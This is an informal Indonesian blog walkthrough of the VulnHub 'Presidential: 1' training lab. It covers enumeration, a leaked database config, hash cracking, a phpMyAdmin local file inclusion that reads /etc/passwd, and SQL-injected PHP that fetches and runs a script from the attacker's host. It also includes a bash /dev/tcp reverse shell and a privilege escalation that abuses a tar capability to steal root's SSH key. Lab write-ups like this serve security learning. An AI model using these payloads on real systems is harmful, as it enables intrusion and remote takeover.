---
layout: post
title: 'VulnHub - Presidential: 1'
date: 2020-07-12
categories: [vulnhub]
tags: [RCE, LFI, mis-config]
---

Sebelumnya mohon maaf tentang kata/bahasa yang tidak pantas saya ucapkan disini dan juga saya adalah seorang pemalas yang malas untuk mengganti semua kata itu, karena ini adalah note lama saya yang sudah terpendam sekian lama.

**[Presidential](https://www.vulnhub.com/entry/presidential-1,500/)**

# Enumeration
## Netdiscover

`netdiscover -i eth0`

![img](https://i.ibb.co/BT08BX6/netdiscover.jpg)

gw coba satu" dan akhirnya ketemu juga `192.168.172.134`.

# Recon
## Nmap

kali ini gw makenya [RustScan](https://github.com/RustScan/RustScan) karena biar agak cepet dikit.<br/>

```bash
[root@skofos]:~/Desktop/vh/presidential# rustscan -T 1500 192.168.172.134 -- -A -sC -sV -oN presidential.scan

     _____           _    _____                                                                                                                                                               
    |  __ \         | |  / ____|                                                                                                                                                              
    | |__) |   _ ___| |_| (___   ___ __ _ _ __                                                                                                                                                
    |  _  / | | / __| __|\___ \ / __/ _` | '_ \                                                                                                                                               
    | | \ \ |_| \__ \ |_ ____) | (_| (_| | | | |                                                                                                                                              
    |_|  \_\__,_|___/\__|_____/ \___\__,_|_| |_|                                                                                                                                              
    Faster nmap scanning with rust.                                                                                                                                                           
 Automated Decryption Tool - https://github.com/ciphey/ciphey 
 Creator https://github.com/brandonskerritt
WARNING: Your file description limit is lower than selected batch size. Please considering upping this (how to is on the README). NOTE: this may be dangerous and may cause harm to sensitive servers. Automatically reducing Batch Size to match your limit, this process isn't harmful but reduces speed.                                                                                 
Open 80
Open 2082
Starting nmap.
The Nmap command to be run is -A -sC -sV -oN presidential.scan -Pn -vvv -p 80,2082 192.168.172.134
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-04 11:25 EDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:25
Completed NSE at 11:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:25
Completed NSE at 11:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:25
Completed NSE at 11:25, 0.00s elapsed
Initiating ARP Ping Scan at 11:25
Scanning 192.168.172.134 [1 port]
Completed ARP Ping Scan at 11:25, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:25
Completed Parallel DNS resolution of 1 host. at 11:25, 0.04s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 3, TR: 3, CN: 0]
Initiating SYN Stealth Scan at 11:25
Scanning 192.168.172.134 [2 ports]
Discovered open port 80/tcp on 192.168.172.134
Discovered open port 2082/tcp on 192.168.172.134
Completed SYN Stealth Scan at 11:25, 0.05s elapsed (2 total ports)
Initiating Service scan at 11:25
Scanning 2 services on 192.168.172.134
Completed Service scan at 11:25, 6.05s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.172.134
NSE: Script scanning 192.168.172.134.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:25
Completed NSE at 11:25, 0.28s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:25
Completed NSE at 11:25, 0.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:25
Completed NSE at 11:25, 0.00s elapsed
Nmap scan report for 192.168.172.134
Host is up, received arp-response (0.00061s latency).
Scanned at 2020-08-04 11:25:43 EDT for 8s

PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.6 ((CentOS) PHP/5.5.38)
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.5.38
|_http-title: Ontario Election Services &raquo; Vote Now!
2082/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 06:40:f4:e5:8c:ad:1a:e6:86:de:a5:75:d0:a2:ac:80 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMI84YRpnLBsf4QIK/qH3yifMs49tmZDsZI54D8PxWcmSabJORvZTktzCgH1prKFSr0ZcYLFVGX10vn1v2VFFAXZexf5ApjUaJ0OpWNks3P2BIXMWdugkQ1MdP38lcRBksH6+a84dMeA3qtODwA2CpRkKUlhrLuUjlDiB+YAGDhH6Ku0uiGkYAu9zUSW6OETSmWU7BrixYvWJX0E3jWraevF3lgZCl7i0ou8si0b/iXEuQYX0qO4orcdEp1IAZX0K4j+hH7ssfRvlU9Y8wNDXMFvElbnObmS6Rn3s/y9Zru7RYVWu96dbVN1qWrLvdozuOYENVXwjdDiA2YGzD0Hy9
|   256 e9:e6:3a:83:8e:94:f2:98:dd:3e:70:fb:b9:a3:e3:99 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDil7d9FyzMoBaDDMs6JSw8ZJfGi57gkbnU5ghrPBeYx9Lm4zHcP883tOQjnBthnyrjnvCTHfGlppDsdDmHS1eM=
|   256 66:a8:a1:9f:db:d5:ec:4c:0a:9c:4d:53:15:6c:43:6c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIujGDZtzykOiJxKJi59sA5VD17ENBvz5UM3FdvghWJv
MAC Address: 00:0C:29:A5:E0:BE (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=8/4%OT=80%CT=%CU=44463%PV=Y%DS=1%DC=D%G=N%M=000C29%TM=
OS:5F297DFF%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%TS=A)OPS(O1
OS:=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW
OS:7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=
OS:Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%R
OS:D=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%
OS:DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%
OS:O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=4
OS:0%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.023 days (since Tue Aug  4 10:52:48 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.61 ms 192.168.172.134

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:25
Completed NSE at 11:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:25
Completed NSE at 11:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:25
Completed NSE at 11:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.20 seconds
           Raw packets sent: 25 (1.894KB) | Rcvd: 17 (1.366KB)
```
dari hasil `nmap` menurut gw sih gk ada jalan untuk melanjutkan, dan akhirnya gw putus asa dan mencoba untuk melihat-lihat website box ini. karena gw lola gw baru *ngeh* pas ngeliat email `contact@votenow.local` gw liat-liat tuh, gw kaget lah ini ada domainnya ajg jadi gw coba untuk memasukkan IP HOST dan domain box ini ke `/etc/hosts` habis itu gw *recon* lagi pake `gobuster` sapa tau ada yang aneh atau ngga.

![img2](https://i.ibb.co/0jNR0cy/hosts.png)

## Gobuster #1

pas gw `gobuster` ternyata keluarnya ya gini" aja, ada yg ganjil.

```bash
gobuster dir -u http://votenow.local/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,php.bak,html,txt
```
![img2](https://i.ibb.co/tYyHgFn/gobuster.png)

```php
<?php

$dbUser = "votebox";
$dbPass = "casoj3FFASPsbyoRP";
$dbHost = "localhost";
$dbname = "votebox";

?>
```
kata gw ini file backup-an yang sempet lupa untuk dihapus alias miss-configuration.

## Gobuster #2

mungkin ada lagi hal yang menarik kalo gw scan *recon* pake host dengan command yg ada dibawah ini, tapi nanti gw tau bakalan rame dan susah untuk dicari, jadi gw coba *grep*-in satu satu status dari host itu, dan akhirnya setelah gw coba gw dapetlah hal menarik dengan command `grep "Status: 200"`.
```bash
gobuster vhost votenow.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
```bash
gobuster vhost -u votenow.local --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | grep "Status: 200"                                                                             
```
![img4](https://i.ibb.co/tZXQF8v/datasafe.png)

lalu, setelah gw dpt langsung coba. eh masuknya malah ke *mercusuar* kan gblk. jadi gw kepikiran untuk save dulu ke `/etc/hosts` dan akhirnya gw bisa masuk ke panel `PhpMyAdmin`lalu gw masuk dan pas itu gw lansung plonga plongo kek orang idiot gitu, dan tiba" gw ngeliat ke versi dari panel *PhpMyAdmin* ini langsung gw cari pake `searchsploit` siapa tau ada exploitnya / semacamnya lah. dan yah...

![img5](https://i.ibb.co/qRKkgbY/searchsploit.png)

lalu setelah gw nyari itu exploit gw ketemu `user:password` yang terenkripsi.

![img6](https://i.ibb.co/kqZDD1n/admin.png)

lalu gw crack lah pake `john` password cracking paling terkenal katanya. dan gw udah coba berkali-kali crack pake *dictionary wordlist* yg paling terkenal yaitu *rockyou.txt* lama beut cog ngecracknya wkwkwk, jadi gw pake single wordlist yg sedeng aja di path `/usr/share/john/password.lst` biar cepet.

![img7](https://i.ibb.co/nC2TCzW/password.png)

Dan password telah ter-crack. `Stella` merek apaan dah pewangi ruangan ya? wkwkwk. dan lanjut ke exploit buat dpt user flag.

# Exploit
## Local File Inclusion

menurut [exploit](https://www.exploit-db.com/exploits/44928)nya pertama tama gw harus masukin code yang dibawah ini ke SQL server-nya.
```php
select '<?php phpInfo();exit;?>'
```

![img8](https://i.ibb.co/7g8swxb/phpserverpng.png)

terus katanya masukin juga payload buat baca session file gitu.
```php
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_(cookie session, kalo g tau letak cookie pake extension di browser namanya CookieEditor)
```
tapi kalo di gw kok malah error" gitu jadi karena ilmu gw dikit, gw putuskan untuk coba ngread file *passwd* dan pas gw test ternyata bisa.
```php
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
```

![passwd](https://i.ibb.co/XYyjLHz/passwd.png)

dan hasilnya bisa, oke jadi langsung gw buat *payload* alias *reverse tcp shell* lewat sql server tadi.

## Remote Code Execution

jadi gw masukin *reverse shell* seperti yg gw bilang tadi, masukin lewat sql server.
```php
select '<?php system("wget http://192.168.172.128:10/skofos.sh -o skofos.sh; chmod +x skofos.sh; bash skofos.sh;");exit?>
```
ini code yang gw buat untuk *revere shell* nya
```sh
bash -i > /dev/tcp/192.168.172.128/1337 0>&1
```
yaudah habis itu gw nyalain *netcat* dgn port 1337 seperti yg gw buat di *reverse shell* itu.

## User.txt

![netcat](https://i.ibb.co/bsrf32K/netcat.png)

![lmao](https://i.ibb.co/Lk18YT0/user.png)

# Privilege Escalation

pas saya baca itu ada *new command* aka perintah baru atau apa itu, untuk membackup suatu file dan meng-compress tanpa perlu ijin root. terus saya googling dan saya lupa sumbernya dari mana nanti kalo ketemu saya taro sini, jadi saya liat pake command `getcap -r / 2>/dev/null`. 

![getcap](https://i.ibb.co/557vN7r/escalation.png)

dan ketemulah `tarS` yg saya bilang tadi untuk compress tanpa ijin root/jadi root. habis tak compress langsung saya decompress biar filenya bisa dibaca.
dan yeah, saya dapet itu `id_rsa` biar bisa masuk akses lewat `ssh` menjadi bagian root.

![id_rsa](https://i.ibb.co/VjZLcGx/id-rsa.png)

![root](https://i.ibb.co/Kysy52R/root.png)

yaah, gw copy itu `id_rsa` dengan command `chmod 600 id_rsa` biar bisa ke akses, btw itu kenapa ada port 2082? kalo diperhatikan saat gw *recon* pake `nmap` kan disitu tertulis *port* untuk `ssh` yaitu 2082, jadi gw pake itu biar bisa masuk. okelaaah.


